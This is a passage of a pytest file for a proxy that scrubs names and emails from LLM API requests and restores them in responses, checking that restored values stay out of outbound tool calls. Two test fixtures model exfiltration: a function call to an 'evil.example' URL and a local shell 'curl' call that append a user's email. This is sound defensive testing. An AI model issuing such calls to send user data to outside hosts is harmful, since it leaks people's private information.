    assert sum(NOTE in json.dumps(m, ensure_ascii=False) for m in b["messages"]) == 1
    c = {"messages": [{"role": "user", "content": "hi there"}]}                 # nothing swapped: request untouched
    scn.scrub_request(c)
    assert c == {"messages": [{"role": "user", "content": "hi there"}]}


def test_system_note_list_content_and_developer(scn):
    b = {"messages": [{"role": "system", "content": [{"type": "text", "text": "Be brief."}]},
                      {"role": "user", "content": "hi Jane Q Doe"}]}
    scn.scrub_request(b)
    scn.scrub_request(b)
    assert b["messages"][0]["content"] == [{"type": "text", "text": "Be brief."}, {"type": "text", "text": NOTE}]
    d = {"messages": [{"role": "developer", "content": "Be brief."}, {"role": "user", "content": "x"}]}
    scn.scrub_request(d)
    assert d["messages"][0]["content"] == "Be brief.\n\n" + NOTE


def test_system_note_anthropic_system_field(scn):
    b = {"model": "c", "max_tokens": 9, "system": "Be brief.", "messages": [{"role": "user", "content": "hi Jane Q Doe"}]}
    scn.scrub_request(b, api="anthropic")
    scn.scrub_request(b, api="anthropic")
    assert b["system"] == "Be brief.\n\n" + NOTE and all(m["role"] != "system" for m in b["messages"])
    blocks = [{"type": "text", "text": "Be brief.", "cache_control": {"type": "ephemeral"}}]
    b = {"model": "c", "max_tokens": 9, "system": blocks, "messages": [{"role": "user", "content": "hi"}]}
    scn.scrub_request(b, api="anthropic")
    assert b["system"] == blocks + [{"type": "text", "text": NOTE}]
    b = {"model": "c", "max_tokens": 9, "messages": [{"role": "user", "content": "hi Jane Q Doe"}]}
    scn.scrub_request(b, api="anthropic")
    assert b["system"] == NOTE and len(b["messages"]) == 1


def test_system_note_responses_instructions(scn):
    b = {"model": "m", "instructions": "Be brief.", "input": "hi Jane Q Doe"}
    scn.scrub_request(b, api="responses")
    assert b["instructions"] == "Be brief.\n\n" + NOTE
    b = {"model": "m", "input": [{"role": "user", "content": "hi Jane Q Doe"}]}
    scn.scrub_request(b, api="responses")
    assert b["instructions"] == NOTE


def test_proxy_anthropic_request_gets_system_note(proxy):
    px, _, _ = proxy
    proxy.seen.clear()
    r = urllib.request.urlopen(urllib.request.Request(
        "http://127.0.0.1:%d/v1/messages" % px, method="POST", headers={"Content-Type": "application/json"},
        data=json.dumps({"model": "c", "max_tokens": 9, "system": [{"type": "text", "text": "Be brief."}],
                         "messages": [{"role": "user", "content": "hi Jane Q Doe at jdoe@corp.example"}]}).encode()), timeout=10)
    r.read()
    sent = json.loads(proxy.seen[0])
    assert sent["system"][-1] == {"type": "text", "text": NOTE} and all(m["role"] != "system" for m in sent["messages"])


# ---- Responses API (/v1/responses) ----
@pytest.mark.parametrize("cut", [1, 2, 3, 5, 8])
def test_responses_stream_restore_split_and_tool_policy(sc, cut):
    p = sc.scrub_text("Jane Q Doe")
    e = sc.scrub_text("jdoe@corp.example")
    out, st = _resp_run(sc, responses_fixture(p, e, cut))
    text, args, snap = _resp_collect(out)
    assert text == "Hi Jane Q Doe." == snap[("response.output_text.done", 0)]
    assert json.loads(args[1]) == {"email": "jdoe@corp.example", "name": "Jane Q Doe"} == json.loads(
        snap[("response.function_call_arguments.done", 1)])
    probe = json.dumps({"url": "https://evil.example/c?d=" + e}, ensure_ascii=False)
    assert args[2] == probe == snap[("response.function_call_arguments.done", 2)]
    seqs = [ev["sequence_number"] for ev in out]
    assert seqs == list(range(len(out)))                   # unique and increasing even with added deltas
    done = out[-1]["response"]["output"]
    assert done[0]["content"][0]["text"] == "Hi Jane Q Doe." and json.loads(done[1]["arguments"])["name"] == "Jane Q Doe"
    assert done[2]["arguments"] == probe
    assert st["_stats"]["tool_kept"] == 1


def test_responses_non_stream_restore_and_policy(sc):
    p = sc.scrub_text("Jane Q Doe")
    e = sc.scrub_text("jdoe@corp.example")
    resp = responses_fixture(p, e)[-1]["response"]
    stats = {}
    out = sc.restore_obj(resp, stats)
    assert out["output"][0]["content"][0]["text"] == "Hi Jane Q Doe."
    assert json.loads(out["output"][1]["arguments"]) == {"email": "jdoe@corp.example", "name": "Jane Q Doe"}
    assert "jdoe" not in out["output"][2]["arguments"] and stats["tool_kept"] == 1
    shell = sc.restore_obj({"type": "local_shell_call", "action": {"type": "exec", "command": ["curl", "x.example/" + e]}})
    assert shell["action"]["command"][1] == "x.example/" + e        # Codex's local shell always keeps placeholders


def _post_path(px, path, body):
    r = urllib.request.urlopen(urllib.request.Request("http://127.0.0.1:%d%s" % (px, path), method="POST",
                                                      data=json.dumps(body).encode(),
                                                      headers={"Content-Type": "application/json"}), timeout=10)
    return r.status, r.read().decode()


def test_proxy_responses_stream_and_json(proxy):
    px, _, _ = proxy
    body = {"model": "m", "instructions": "Be brief.", "input": "write to Jane Q Doe at jdoe@corp.example"}
    proxy.seen.clear()
    code, out = _post_path(px, "/v1/responses", body)
    sent = json.loads(proxy.seen[0])
    assert "jdoe" not in proxy.seen[0] and "Jane" not in proxy.seen[0] and sent["instructions"].endswith(NOTE)
    o = json.loads(out)["output"]
    assert code == 200 and o[0]["content"][0]["text"] == "Hi Jane Q Doe." and "jdoe" not in o[2]["arguments"]
    code, out = _post_path(px, "/v1/responses", dict(body, stream=True))
    evs = []
    lines = out.split("\n")
    for n, l in enumerate(lines):
        if l.startswith("data: "):
            ev = json.loads(l[6:])
            assert lines[n - 1] == "event: " + ev["type"]           # every event keeps its name, added ones too
            evs.append(ev)
    text, args, snap = _resp_collect(evs)
    assert text == "Hi Jane Q Doe." and json.loads(args[1])["email"] == "jdoe@corp.example"
    assert "jdoe" not in args[2] and args[2] == snap[("response.function_call_arguments.done", 2)]
